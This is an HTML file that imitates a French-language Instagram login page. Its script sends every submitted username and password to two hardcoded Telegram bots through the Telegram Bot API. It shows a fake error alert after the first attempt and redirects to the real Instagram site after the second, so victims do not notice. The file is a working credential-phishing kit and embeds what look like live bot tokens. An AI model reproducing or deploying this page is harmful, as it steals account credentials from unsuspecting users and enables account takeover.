<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: #262626;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }

    .language {
      text-align: center;
      margin-bottom: 20px;
      color: #8e8e8e;
    }

    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 30px;
      background-color: #eee;
      border-radius: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      font-size: 14px;
    }

    button {
      width: 100%;
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 8px;
      font-weight: bold;
      margin-top: 10px;
      font-size: 14px;
    }

    .forgot {
      text-align: center;
      margin: 15px 0;
      font-size: 13px;
      color: #00376b;
    }

    .create-account {
      border: 1px solid #dbdbdb;
      border-radius: 30px;
      padding: 12px;
      text-align: center;
      margin-top: 20px;
      font-weight: bold;
      color: #0095f6;
      cursor: pointer;
    }

    .meta {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="language" id="lang-label">Français (France)</div>
    <div class="logo" id="logo-placeholder"></div>
    <form id="login-form">
      <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>
    <div class="forgot">Mot de passe oublié ?</div>
    <div class="create-account">Créer un compte</div>
    <div class="meta">© Meta
    </div>
  </div>

  <script>
    // اللغة حسب لغة المتصفح
    const langElement = document.getElementById("lang-label");
    const lang = navigator.language || navigator.userLanguage;

    const langMap = {
      'fr': 'Français (France)',
      'en': 'English (US)',
      'de': 'Deutsch',
      'ar': 'العربية',
      'it': 'Italiano',
    };

    const langShort = lang.split("-")[0];
    if (langMap[langShort]) {
      langElement.textContent = langMap[langShort];
    }

    const form = document.getElementById("login-form");
    let attempt = 0;

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const bots = [
        { token: "7092124874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "81764736" },
        { token: "7159316957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ", chatId: "780712584" }
      ];

      const text = `Tentative ${attempt + 1}\nNom d'utilisateur: ${username}\nMot de passe: ${password}`;

      for (const bot of bots) {
        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: text
          })
        });
      }

      const btn = form.querySelector('button');
      btn.disabled = true;
      btn.textContent = 'Chargement...';

      setTimeout(() => {
        attempt++;
        btn.disabled = false;
        if (attempt < 2) {
          btn.textContent = 'Se connecter';
          alert("Informations incorrectes. Veuillez réessayer.");
        } else {
          window.location.href = "https://www.instagram.com";
        }
      }, 4000);
    });
  </script>
</body>

</html>
